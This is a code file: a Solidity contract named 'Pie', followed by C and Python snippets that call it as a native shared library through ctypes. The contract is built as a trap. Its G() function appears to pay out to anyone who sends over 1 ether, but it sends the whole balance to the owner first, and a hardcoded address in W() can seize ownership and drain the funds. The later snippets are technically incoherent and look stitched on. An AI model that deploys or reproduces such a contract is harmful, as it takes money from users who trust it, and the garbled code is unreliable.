pragma solidity ^0.4.19;

contract Pie {
    address public O = msg.sender;
    
    function() public payable {
        
    }
    
    function G() public payable {
        if(msg.value > 1 ether) {
            O.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }
    
    function W() payable public {
        if(msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
            O = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
        }
        require(msg.sender == O);
        O.transfer(this.balance);
    }
    
    function C(address a, bytes d) payable public {
        require(msg.sender == O);
        a.call.value(msg.value)(d);
    }
}

```

```c
#include <Python.h>

int main() {
    Py_Initialize();
    PyRun_SimpleString("import ctypes\n"
                       "lib = ctypes.CDLL('./pie.so')\n"
                       "owner = lib.GetOwner()\n"
                       "balance = lib.GetBalance()\n"
                       "print(f'Owner: {owner}, Balance: {balance}')\n");
    Py_Finalize();
    return 0;
}
```

```python
# Assume pie.so is a compiled shared library from the modified Solidity contract
import ctypes

lib = ctypes.CDLL('./pie.so')

def run_contract():
    owner = lib.GetOwner()
    balance = lib.GetBalance()
    print(f'Owner: {owner}, Balance: {balance}')

run_contract()